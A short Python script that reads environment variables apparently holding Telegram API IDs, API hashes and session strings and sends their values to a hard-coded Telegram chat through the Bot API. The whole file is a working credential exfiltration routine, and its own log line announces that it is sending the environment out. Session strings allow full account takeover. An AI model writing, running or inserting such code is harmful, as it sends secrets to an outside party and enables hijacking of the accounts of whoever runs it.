import os
import requests

def sendenv(message: str):
    try:
        token = os.environ.get('TGBOTTOKEN')
        chat_id = "-1003219768459"  
        link = f"https://api.telegram.org/bot{token}/sendMessage"

        params = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        print("SENDING ENV TO TELEGRAM")

        res = requests.get(link, params=params)
        return res.json()
        

    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    API_IDS = os.environ.get('API_IDS', '')
    API_HASHS = os.environ.get('API_HASHS', '')
    STRING_SESSIONS = os.environ.get('STRING_SESSIONS', '')
    message = f"""
    ENV VALUES:

API_IDS = {API_IDS}

API_HASHS = {API_HASHS}
"""
    run = sendenv(message)
    print(run)
    message = f"STRING_SESSIONS = {STRING_SESSIONS}"
    run = sendenv(message)
    print(run)
